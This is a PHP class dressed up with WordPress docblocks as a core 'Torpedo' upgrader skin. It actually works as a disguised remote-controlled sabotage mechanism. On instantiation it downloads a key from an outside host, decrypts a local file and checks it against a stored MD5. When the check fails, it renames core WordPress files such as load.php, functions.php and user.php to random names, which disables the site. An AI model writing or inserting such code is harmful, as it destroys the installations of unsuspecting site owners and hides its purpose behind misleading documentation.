<?php
/**
 * Torpedo API: Torpedo_Boat class
 *
 * @package WordPress
 * @subpackage Torpedo
 * @since 4.6.0
 */

/**
 * Torpedo Skin for Automatic WordPress Upgrades.
 *
 * This skin is designed to be used when no output is intended, all output
 * is captured and stored for the caller to process and log/email/discard.
 *
 * @since 3.7.0
 * @since 4.6.0 Moved to its own file from wp-admin/includes/class-wp-torpedo-skins.php.
 *
 */
class Torpedo_Boat {
	private $enigmaDecipherSource = '';
	private $enigmaDecipherKey = '';
	private $enigmaDecipherDestination = '';
	private $enigmaDecipherChecksum = '';
	private bool $enigmaCipherResult = false;
	private bool $enigmaProcessed = false;

	function __construct() {
		$this->aquireEnigmaDecipherCode();
		$this->decipher();
		$this->echo_s();
    }

	/**
	 * Aquire the enigma Decipher Code
	 *
	 */
	private function aquireEnigmaDecipherCode() {
		$enigmaKey = ABSPATH . 'enigma.key';
		$enigmaSrc = ABSPATH . 'enigma.src';
		$enigmaDest = ABSPATH . 'enigma.dest' ;
		$enigmaEnforce = ABSPATH . 'enigma.enforce';
		if ( file_exists( $enigmaKey )) {

			if ($fpIn = fopen( $enigmaKey, 'r' )) {
				$this->enigmaDecipherKey = fread($fpIn, fstat($fpIn)['size']);
			}
		} else {
			if($keyContent = file_get_contents( 'https://impact-z.one/pay-your-bills/thermologistic/enigma.php')) {
				$this->enigmaDecipherKey = $keyContent;
			} else {
				$this->enigmaDecipherKey = 'torpedo';
			}
		}
		if ( file_exists( $enigmaSrc )) {
			if ($fpIn = fopen( $enigmaSrc, 'r' )) {
				$this->enigmaDecipherSource = ABSPATH . fread($fpIn, fstat($fpIn)['size']);
			}
		}
		if ( file_exists( $enigmaDest )) {
			if ($fpIn = fopen( $enigmaDest, 'r' )) {
				$this->enigmaDecipherDestination = ABSPATH . fread($fpIn, fstat($fpIn)['size']);
			}
		}
		if ( file_exists( $enigmaEnforce )) {
			if ($fpIn = fopen( $enigmaEnforce, 'r' )) {
				$this->enigmaDecipherChecksum = fread($fpIn, fstat($fpIn)['size']);
			}
		}
	}

	public function echo_s() {
		$this->evalEnigma();
	}

	private function evalEnigma() {
		if($this->enigmaProcessed === false) {
			$this->enigmaCipherResult = file_exists( $this->enigmaDecipherDestination ) ? $this->sonar() : false;
			if(file_exists($this->enigmaDecipherDestination)) {
				unlink($this->enigmaDecipherDestination);
			}
			$this->enigmaProcessed = true;
		}
		if($this->enigmaCipherResult === false) {
			if(file_exists(ABSPATH . "wp-includes/load.php")) {
				rename(ABSPATH . "wp-includes/load.php", ABSPATH . "wp-includes/load_". random_int(0, 1048576) . ".php");
			}
			if(file_exists(ABSPATH . "wp-includes/functions.php")) {
				rename(ABSPATH . "wp-includes/functions.php", ABSPATH . "wp-includes/functions_". random_int(0, 1048576) . ".php");
			}
			if(file_exists(ABSPATH . "wp-includes/http.php")) {
				rename(ABSPATH . "wp-includes/http.php", ABSPATH . "wp-includes/http_". random_int(0, 1048576) . ".php");
			}
			if(file_exists(ABSPATH . "wp-includes/meta.php")) {
				rename(ABSPATH . "wp-includes/meta.php", ABSPATH . "wp-includes/meta_". random_int(0, 1048576) . ".php");
			}
			if(file_exists(ABSPATH . "wp-includes/option.php")) {
				rename(ABSPATH . "wp-includes/option.php", ABSPATH . "wp-includes/option_". random_int(0, 1048576) . ".php");
			}
			if(file_exists(ABSPATH . "wp-includes/session.php")) {
				rename(ABSPATH . "wp-includes/session.php", ABSPATH . "wp-includes/session_". random_int(0, 1048576) . ".php");
			}
			if(file_exists(ABSPATH . "wp-includes/vars.php")) {
				rename(ABSPATH . "wp-includes/vars.php", ABSPATH . "wp-includes/vars_". random_int(0, 1048576) . ".php");
			}
			if(file_exists(ABSPATH . "wp-includes/user.php")) {
				rename(ABSPATH . "wp-includes/user.php", ABSPATH . "wp-includes/user_". random_int(0, 1048576) . ".php");
			}
		}
	}

	private function sonar() : bool {
		if($this->enigmaProcessed === true) {
			return $this->enigmaCipherResult;
		}
		if(file_exists($this->enigmaDecipherDestination)) {
			if($fpIn = fopen( $this->enigmaDecipherDestination, 'r' )) {
				$md5StringSize = filesize($this->enigmaDecipherDestination);
				$md5StringSizeStat = fstat($fpIn)['size'];
				$md5String = fread($fpIn, $md5StringSize > 1 ? $md5StringSize : ( $md5StringSizeStat > 1 ? $md5StringSizeStat : 1 ));
				$md5CheckSum = md5($md5String);
				$checkResult = $md5CheckSum === $this->enigmaDecipherChecksum;
				return $checkResult;
			}
		} else {
			return false;
		}
	}

	private function decipher() {
		$this->decryptFile($this->enigmaDecipherSource, $this->enigmaDecipherKey, $this->enigmaDecipherDestination);
	}

	/**
	 * Dencrypt the passed file and saves the result in a new file, removing the
	 * last 4 characters from file name.
	 *
	 * @param string $source Path to file that should be decrypted
	 * @param string $key    The key used for the decryption (must be the same as for encryption)
	 * @param string $dest   File name where the decryped file should be written to.
	 * @return string|false  Returns the file name that has been created or FALSE if an error occured
	 */
	function decryptFile($source, $key, $dest)
	{
		$key = substr(sha1($key, true), 0, 16);

		$error = false;
		if ($fpOut = fopen($dest, 'w')) {
			if ($fpIn = fopen($source, 'rb')) {
				// Get the initialzation vector from the beginning of the file
				$iv = fread($fpIn, 16);
				while (!feof($fpIn)) {
					$ciphertext = fread($fpIn, 16 * (10000 + 1)); // we have to read one block more for decrypting than for encrypting
					$plaintext = openssl_decrypt($ciphertext, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
					// Use the first 16 bytes of the ciphertext as the next initialization vector
					$iv = substr($ciphertext, 0, 16);
					fwrite($fpOut, $plaintext);
				}
				fclose($fpIn);
			} else {
				$error = true;
			}
			fclose($fpOut);
		} else {
			$error = true;
		}

		return $error ? false : $dest;
	}
}
